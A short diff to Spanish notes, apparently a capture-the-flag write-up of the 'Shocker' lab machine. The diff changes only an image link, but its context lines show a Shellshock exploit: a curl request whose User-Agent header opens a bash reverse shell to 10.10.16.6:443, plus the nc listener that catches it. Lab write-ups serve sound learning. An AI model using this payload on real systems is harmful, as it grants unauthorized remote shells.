@@ -118,7 +118,7 @@ Vamos a usar [[curl]] con el comando `curl -s -X GET "http://10.10.10.56/cgi-bin
 	se pone el ;echo;echo para separar el payload malioso del comando `curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh" -H "User-Agent: () { :; }/bin/bash -i >& /dev/tcp/10.10.16.6/443 0>&1"`
 
 Ahora nos vamos a poner en escucha con [[nc -nlvp 443]]
-![[Imagenes/Shocker1.png]]
+![[Shocker1.png]]
 Ya ganamos acceso a la maquina
 
 -----
